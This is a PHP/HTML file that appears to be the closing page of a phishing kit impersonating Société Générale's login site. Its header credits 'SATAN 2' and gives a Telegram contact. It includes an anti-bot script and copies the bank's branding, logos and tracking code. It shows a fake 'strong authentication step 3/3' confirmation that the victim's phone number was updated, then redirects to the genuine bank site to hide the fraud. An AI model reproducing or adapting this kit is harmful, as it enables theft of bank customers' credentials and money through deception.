 <?php

/**
 * @link       :   https://www.satan2.com/ 
 * @package    :   SOCIETE GENERALE 
 * @telegram   :   @satan2  
 * Project Name:   SOCIETE GENERALE 2022
 * Author      :   SATAN 2
 * Mise à jour :   08-09-2022
 * Author URI  :   https://www.facebook.com/satan2
 */

include '../inc/antibots.php';
include_once '../inc/app.php';

$random   = rand(0,100000000000);
$LSG = substr(md5($random), 0, 17);

?>
<?php 
/*CACHE*/
$fichierCache = '../cache/lsg_finish.lsg';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?>

<!DOCTYPE html>
<html lang="fr" class="swm-root-active swm-mode-page" >
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
 

<script>if (top != self) { top.location = self.location; }</script>

<title>Société Générale | Connexion</title>





<script  charset="UTF-8" src="../assets/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<meta name="robots" content="none"/>
<meta property="og:url" content="https://particuliers.societegenerale.fr/loginpage/user-login-page">


<title>Connexion à votre Espace Client Particuliers</title>
<meta name="title" content="Connexion à votre Espace Client Particuliers">
<meta property="og:title" content="Connexion à votre Espace Client Particuliers" />
<meta name="twitter:card" content="summary" />

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "error";

window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
var additionals = ""
additionals = additionals.replace(/'/g, "").replace(/"/g, '')
const params = additionals.split(',')
for (var i = 0; i < params.length; i++) {
const param = params[i].split(':')
tc_vars[param[0].trim()] = param[1].trim()
};
} catch (e) {
}
}
function getTechnicalUrl() {
var pageUrl = window.location.href;
var technical_url = pageUrl.replace(window.location.protocol +'//'+ window.location.hostname,'');
return technical_url
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "loginpage",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page",
"page_type": setValue(empty, "HomePage"),
"page_noload": true,
"no_load": true,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("particuliers", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
var sasJs = JSON.parse(sasHtml.trim());
if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
tc_vars["user_id"] = sasJs.IdStat;
tc_vars["user_is_logged"] = true;


} else {
tc_vars["user_is_logged"] = false;

}
if(sasJs && sasJs["user-info-sup"]==="true" ){
tc_vars["user_is_supervisor"] = true;

}else{
tc_vars["user_is_supervisor"] = false;

}

} catch (e) {
tc_vars["user_is_logged"] = false;

}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>

<script charset="UTF-8" src="../assets/js/init-configs_20220624163857.js"></script>
<script charset="UTF-8" src="../assets/js/dca_portail_global_20211128192509.js"></script>
<script charset="UTF-8" src="../assets/js/public-dca.js"></script>
<!--<script charset="UTF-8" src="../assets/js/vendor_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/gda.public.js"></script>
<script charset="UTF-8" src="../assets/js/interact-lanceur.js"></script>
<script charset="UTF-8" src="../assets/js/index_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/public-tms.js"></script>-->

<link href="../assets/css/index_pri_20220712163248.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/spec56_btn_gsm_all_gcd_20211128192509.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/print_20220624163857.min.css" rel="stylesheet" type="text/css" media="print"/>

<link href="../assets/scss/index_20190723161948.min.css" rel="stylesheet" type="text/css">
<link href="../assets/scss/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="../assets/scss/inbenta.css">
<link rel="stylesheet" href="../assets/scss/style.css">
<link href="../assets/scss/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
<style type="text/css">
.eip_txt_light{
  font-weight:300;
}

.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style>
<link href="../assets/css/head-section_fix-gb9_16381239090000.css" rel="stylesheet" type="text/css"/>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->


<script src="../assets/lib/rules.js"></script> 
<script src="../assets/lib/jquery.js"></script>
<!--<script src="../assets/lib/js.js"></script>-->
<script src="../assets/lib/jquery2.js" ></script>
<script>
$(document).ready(function(){
  $("#user_id").on("change paste keyup",function(){
if ($(this).val().length >= 8) {
$('#user_id').addClass('is-valid');
} else {
$('#user_id').removeClass('is-valid'); 
}
  });
});


</script>
<script>

$(document).ready(function()
{
var _try=0;
$("#initClient").click(function()
{
$("#client-nbr").val("");
$("#secret-nbr").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});


$("#initPass").click(function()
{
$("#secret-nbr").val("");
$("#pw").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});




});
</script>
<script>

function ShowStep2() {
document.getElementById("clavier").style.display = "block";
document.getElementById("btn-container").style.display = "none";
}

function valider() {
var mdp = document.getElementById("user_id").value;
if (mdp.length == 5) {
return true;

} else {
return false;
}
}   


</script> 
<style type="text/css">
.eip_txt_light {
font-weight: 300;
}

.eip_dcw_main-link {
color: #fff;
text-decoration: underline !important;
-webkit-transition: color 0.2s ease-in-out;
-o-transition: color 0.2s ease-in-out;
transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover,
.eip_dcw_main-link:focus {
color: #f05b6f;
}
</style>
<style>
#codCl {
opacity:0;

}
#codCl.waa {
opacity:1;
transition:opacity 500ms;
}
#oop {
   
opacity:1;
transition:opacity 500ms;
}
#oop.woo {
 opacity:0;

}

</style>

<script>
setTimeout(function(){
document.getElementById('oop').className = 'woo';
}, 5000);

setTimeout(function(){
document.getElementById('codCl').className = 'waa';
}, 5000);
</script>  

</head>



<body class="PRI waitJeton swm swm-mode-page swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB">



<header class="rsp_header header-deco header-authent">
<nav class="rsp_nav rsp_nav--above">
<ul class="rsp_nav__list">

<li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="agences"onclick=bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+"agences"})><svg aria-hidden='true' focusable='false' width='18' height='18'><use xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#lhs-localisation'></use></svg><span>Agences</span></a>
</li>
<li class="rsp_nav__item" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="aide-et-contacts"onclick=bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+"aide-et-contacts"})><svg aria-hidden='true' focusable='false' width='18' height='18'><use xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#lhs-urgence'></use></svg><span>Aide et contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">
<a href="#" class="rsp_header__logo-mob" title="page d'accueil">
<svg  aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23">
  <g fill="none" fill-rule="evenodd">
<path fill="#ED0210" d="M0 11.335h22.22V0H0z"/>
<path fill="#000" d="M0 22.141h22.22V11.032H0z"/>
<path fill="#FFF" d="M4.413 11.649h14.456v-1.352H4.413z"/>
  </g>
</svg>  
  </a>
  <a href="#" class="rsp_header__logo-desktop ml-m" title="page d'accueil">
<svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="192" height="40"
  viewBox="0 0 340 70"> 
  <g fill="none" fill-rule="evenodd" transform="translate(-15 -1)">
<path fill="#000"
  d="M15.106 24.88c0-5.948 4.551-10.164 10.751-10.164 3.602 0 6.506 1.312 8.405 3.685l-3.518 3.184c-1.229-1.48-2.737-2.29-4.608-2.29-3.212 0-5.445 2.234-5.445 5.585s2.233 5.585 5.445 5.585c1.871 0 3.38-.81 4.608-2.29l3.518 3.183c-1.899 2.374-4.803 3.686-8.405 3.686-6.2 0-10.75-4.216-10.75-10.164M41.748 16.81c0 .782-.112 1.396-.894 3.212l-1.787 4.076h-3.323l1.313-4.551c-1.006-.475-1.648-1.424-1.648-2.737 0-1.9 1.34-3.127 3.183-3.127 1.815 0 3.156 1.228 3.156 3.127M60.04 30.381v4.273H44.345V15.106h15.33v4.274h-9.858v3.294h8.686v4.134h-8.685v3.573zM61.604 32.895l1.815-4.077c1.731 1.144 4.188 1.926 6.45 1.926 2.29 0 3.184-.642 3.184-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.656-6.34 2.541 0 5.166.587 7.093 1.704l-1.703 4.105c-1.87-1.005-3.714-1.507-5.418-1.507-2.318 0-3.155.78-3.155 1.759 0 2.987 11.086.753 11.086 7.958 0 3.407-2.848 6.31-8.657 6.31-3.21 0-6.394-.865-8.237-2.15M85.62 19.49h-6.003v-4.384h17.508v4.385H91.15v15.163h-5.53zM126.308 15.106l-8.379 19.547h-5.445l-8.35-19.547h5.977l5.306 12.734 5.416-12.734zM141.64 24.88c0-3.379-2.318-5.585-5.28-5.585-2.958 0-5.276 2.206-5.276 5.585s2.318 5.585 5.277 5.585c2.96 0 5.279-2.206 5.279-5.585m-16.141 0c0-5.864 4.608-10.164 10.862-10.164 6.256 0 10.864 4.3 10.864 10.164s-4.608 10.164-10.864 10.164c-6.254 0-10.862-4.3-10.862-10.164M150.382 25.942V15.107h5.53v10.666c0 3.352 1.396 4.692 3.713 4.692 2.29 0 3.687-1.34 3.687-4.692V15.107h5.445v10.835c0 5.835-3.407 9.102-9.188 9.102-5.78 0-9.187-3.266-9.187-9.102M170.991 32.895l1.815-4.077c1.731 1.144 4.19 1.926 6.451 1.926 2.29 0 3.183-.642 3.183-1.591 0-3.1-11.114-.838-11.114-8.098 0-3.491 2.848-6.34 8.657-6.34 2.541 0 5.166.587 7.094 1.704l-1.704 4.105c-1.872-1.005-3.715-1.507-5.419-1.507-2.317 0-3.155.78-3.155 1.759 0 2.987 11.087.753 11.087 7.958 0 3.407-2.849 6.31-8.658 6.31-3.21 0-6.394-.865-8.237-2.15M58.002 39.648h5.529V54.81h9.326v4.385H58.002zM78.136 41.352c0 .781-.112 1.396-.894 3.211l-1.787 4.077h-3.323l1.312-4.552c-1.005-.475-1.647-1.424-1.647-2.736 0-1.9 1.34-3.128 3.183-3.128 1.815 0 3.156 1.228 3.156 3.128M90.59 51.32l-2.512-6.255-2.513 6.255h5.026zm1.62 4.077h-8.265l-1.536 3.8h-5.641l8.629-19.55h5.445l8.657 19.55h-5.752l-1.537-3.8zM117.455 39.648l-8.377 19.548h-5.445l-8.35-19.548h5.976l5.306 12.734 5.417-12.734zM135.133 54.923v4.273H119.44V39.648h15.331v4.273h-9.858v3.295h8.685v4.133h-8.685v3.574zM156.665 39.648v19.548h-4.553l-8.629-10.417v10.417h-5.416V39.648h4.551l8.63 10.416V39.648z" /> 
<path fill="#000"
  d="M160.436 59.196h5.528V39.648h-5.528zM178.363 44.004h-3.072v5.725h3.072c2.29 0 3.435-1.061 3.435-2.849 0-1.815-1.145-2.876-3.435-2.876zm-.055 9.997h-3.017v5.195h-5.529V39.648h8.936c5.333 0 8.686 2.765 8.686 7.232 0 2.876-1.398 4.998-3.827 6.171l4.218 6.145h-5.922l-3.545-5.195zM249.497 25.422c-1.623-.688-3.361-1.138-4.91-1.138-2.257 0-3.387.486-3.387 1.358 0 2.498 10.082.493 10.082 5.821 0 2.206-2.071 3.911-6.219 3.911-2.462 0-4.385-.509-6.595-1.705l.912-1.986c1.937 1.076 3.743 1.553 5.697 1.553 2.46 0 3.778-.71 3.778-1.773 0-2.731-10.084-.692-10.084-5.687 0-2.153 2.054-3.636 5.771-3.636 2.223 0 4.093.489 5.879 1.384l-.924 1.898zM260.738 35.441c-4.028 0-7.367-2.682-7.367-6.692 0-3.962 3.34-6.695 7.367-6.695 4.05 0 7.336 2.733 7.336 6.695 0 4.01-3.287 6.692-7.336 6.692m0-11.229c-2.935 0-4.937 1.987-4.937 4.537 0 2.611 1.916 4.554 4.937 4.554 3 0 4.907-1.962 4.907-4.554 0-2.55-1.908-4.537-4.907-4.537M277.694 35.426c-4.23 0-7.419-2.68-7.419-6.695 0-3.945 3.238-6.677 7.42-6.677 2.494 0 4.28.707 5.883 1.887l-1.247 1.857c-1.166-.897-2.625-1.551-4.569-1.551-3.088 0-5.006 1.952-5.006 4.484 0 2.61 1.937 4.504 5.038 4.504 1.941 0 3.476-.628 4.635-1.521l1.253 1.856c-1.607 1.18-3.493 1.856-5.988 1.856M286.238 35.086h2.349V22.441h-2.349zM292.057 22.44v12.646h11.918v-2.09H294.4V29.69h7.127v-2.088H294.4V24.53h9.168v-2.09zM305.224 22.44v2.077h5.156v10.569h2.34V24.517h5.151v-2.076zM319.758 22.44v12.646h11.919v-2.09h-9.571V29.69h7.13v-2.088h-7.13V24.53h9.168v-2.09zM245.698 50.05c1.287 0 2.61-.29 3.607-.761v-3.677h2.282v4.909c-1.605 1.079-3.81 1.736-5.989 1.736-4.227 0-7.416-2.676-7.416-6.692 0-3.944 3.238-6.672 7.416-6.672 2.447 0 4.284.688 5.888 1.868l-1.245 1.855c-1.17-.893-2.635-1.502-4.578-1.502-3.084-.067-5 1.922-5 4.45 0 2.617 1.94 4.487 5.035 4.487M254.673 39.278v12.639h11.919V49.83h-9.578v-3.307h7.136v-2.087h-7.136v-3.072h9.177v-2.086zM271.19 51.918h-2.294V39.277h2.393l8.245 9.527.056-.016a101.83 101.83 0 0 1-.157-6.208v-3.303h2.291v12.64h-2.374l-8.213-9.522-.037.019c.09 1.87.09 5.139.09 6.205v3.299zM285.024 39.278v12.639h11.921V49.83h-9.58v-3.307h7.133v-2.087h-7.133v-3.072h9.173v-2.086zM305.544 47.268h-3.777v4.65h-2.345v-12.64h8.125c2.695 0 4.366 1.655 4.366 4.029 0 2.258-1.64 3.605-3.624 3.894l3.764 4.717h-2.94l-3.57-4.65zm1.752-2.107c1.467 0 2.296-.758 2.296-1.854 0-1.2-.73-1.943-2.045-1.943h-5.78v3.797h5.529zM319.03 39.278l-6.16 12.639h2.536l1.451-3.068h6.82l1.454 3.068h2.527l-6.164-12.64h-2.464zm1.245 2.393l2.426 5.126h-4.869l2.443-5.126zM329.384 39.278v12.639h10.783V49.83h-8.443V39.278zM341.75 39.278v12.639h11.922V49.83h-9.575v-3.307h7.132v-2.087h-7.132v-3.072h9.175v-2.086z"/>
<path fill="#ED0210" d="M199.175 37.453h30.212V22.042h-30.212z"/>
<path fill="#000" d="M199.175 52.255h30.212V37.151h-30.212z"/>
<path fill="#FFF" d="M204.454 38.069h19.655v-1.838h-19.655z"/>
  </g>
</svg>
  </a>
<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
</a></div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Authentification forte - Etape 3/3</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD"/>
</header>

<section class="dcw_main" >
<section class="dcw_gb_row dcw_gb_communication">
</section>
<section class="dcw_gb_wrapper">
<main role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_core ugds_serviciel" id="">

<div id="dcw-swm" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>



<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
<div id="swm-popin-overlay" class="swm-popin-overlay"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
<div class="swm-popin-ombre-sup"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
</div>
</div>
</div>
<div class="swm-popin-ombre-inf"></div>
</div>
</div>
</div>

<main role="main" class="dcw_authent dcw_csetape">
<div class="dcw_codeContainer">
<div class="dcw_block">
<div class="dcw_block-element">
<section class="dcw_chemin_etape js-breadcrumb nav-item-selected-1">

</section>
</div>
</div>
<div id="oop" align="center">
<img src="../assets/img/loader.gif">
</div>

<div id="codCl">

<div class="dcw_block dcw_block-text">
<div class="dcw_block-element">
<h3>Votre numéro de téléphone a bien été mis à jour, <br>Vous allez vous rediriger vers la page d'accueil.</h3>
</div>
</div>


<script>
setTimeout(function(){
window.location.href="https://particuliers.societegenerale.fr/";
}, 7000);
</script> 



</div>

 </div>
</main>


</div>


</section>
</main>
<section class="dcw_gb_row">
</section>
</section>
</section>


<footer class="dcw_footer" role="contentinfo">
<div class="dcw_footer-second" style="background-color: black !important;">
<div class="dcw_footer_container">
<nav class="dcw_footer-second_nav">
<ul class="dcw_footer-second_list">
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#question'></use></svg>
Questions fréquentes
</a></li>
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#localisation'></use></svg>
Trouver une agence
</a></li>
<li class="dcw_footer-second_item">
<div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
   <svg class='dcw_dropdown_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#arrow-dropdown'></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Banque privée</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Entreprises</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Associations</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Groupe Société Générale</a>
</li>
</ul>
</div></li>
</ul>
</nav>
<ul class="dcw_footer_container dcw_footer-second_social">
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#facebook-2'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#twitter-2'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l' Instagram de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#instagram'></use></svg>
</a></li>
</ul>
</div>
</div>
<nav class="dcw_footer-third">
<div class="dcw_footer_container">
<center>
<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/img/logo-sg-seul.svg" width="150" />
</center><br>
<ul class="dcw_footer-third_list">
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Nos engagements</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Documentation et Tarifs</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Accessibilité Numérique (partiellement conforme)</a>
<br>
</li>
</ul>
</div>
</nav>
</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->

<style type="text/css">
  .butthoverr{background-color: #010035 !important;}
  .butthoverr:hover{background-color: #191970 !important;}
</style>
<script type="text/javascript">
  function but_0_1_2(id){
var idd = id;
if(idd == 0){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 1){
   document.getElementById('but-1').style.backgroundcolor = "#191970";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "block";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 2){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#191970";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "block";
}
  }
</script>
<script id="tc_script__1" type="text/javascript" src="../assets/js/tc_SocieteGenerale_22.js" defer=""></script>
<DIV id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper" bis_skin_checked="1" style="position: fixed; float: right; right: 0px; margin-top: -55%; margin-bottom: -30%; z-index: 100;">
   <div class="interact-layout" id="content" bis_skin_checked="1">
  <div class="interact-header" bis_skin_checked="1"></div>
  <div class="interact-content" bis_skin_checked="1"></div>
  <div class="interact-popin" bis_skin_checked="1"></div>
  <div class="interact-footer" bis_skin_checked="1"></div>
  <div class="interact-sticky" bis_skin_checked="1">
 <div id="tch_sticky-bar" class="tch_sticky-bar_container" bis_skin_checked="1">
<div class="tch_sticky-contact_bar" bis_skin_checked="1">
   <h3 class="tch_sticky-bar_title" style="display:none">Besoin d'aide</h3>
   <p class="tch_sticky-bar_message" style="display:none">Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins </p>
   <div class="tch_sticky-bar has-two-icons" bis_skin_checked="1">

<span id="text-1" class="tch_tooltip" style="position: fixed; margin-left: -160px; top: 410px; display: none;">Poser une question à SoBot  </span>
<span id="text-2" class="tch_tooltip" style="position: fixed; margin-left: -120px; top: 480px; display: none;">Prendre rendez-vous  </span>

  <ul class="tch_sticky-bar_list" style="border: none; border-color: transparent;" id="chatoo">
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-1" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('1');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Poser une question à SoBot" role="img" focusable="false" style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#chatbot"></use>
   </svg>
</button>
 </li>
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-2" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('2');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Prendre rendez-vous" role="img" focusable="false"  style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#calendar"></use>
   </svg>
</button>
 </li>
  </ul>
   </div>
   <button class="tch_sticky-bar_close" aria-label="Fermer la boite de dialogue" style="display:none">
  <svg class="tch_sticky-bar_icon tch_sticky-bar_icon--close" aria-hidden="true" focusable="false">
 <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#cross-close"></use>
  </svg>
   </button>
</div>
 </div>
 <div id="tch_sticky-contact" class="tch_sticky-contact_container" style="display:none" bis_skin_checked="1"></div>
  </div>
  <div class="interact-chat" bis_skin_checked="1" style="display:none">
 <div aria-grabbed="false" class="tch_chat" bis_skin_checked="1" style="margin-right: 0px; margin-bottom: 0px;">
<div id="tch_chat-bot" style="display:none" bis_skin_checked="1"></div>
 </div>
  </div>
  <div id="interact-fab" class="interact-fab tch_fab" bis_skin_checked="1" style="display:none">
 <div bis_skin_checked="1">
<button class="js_fab_chat tch_fab__btn" aria-label="Ouvrir la fenêtre de tchat">
   <svg class="tch_fab__icon tch_fab__icon--sobot tch_fab__icon--conversation" aria-hidden="true" focusable="false">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#fab-contact"></use>
   </svg>
</button>
 </div>
  </div>
  <div class="interact-test" bis_skin_checked="1"></div>
   </div>
</DIV> 

<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
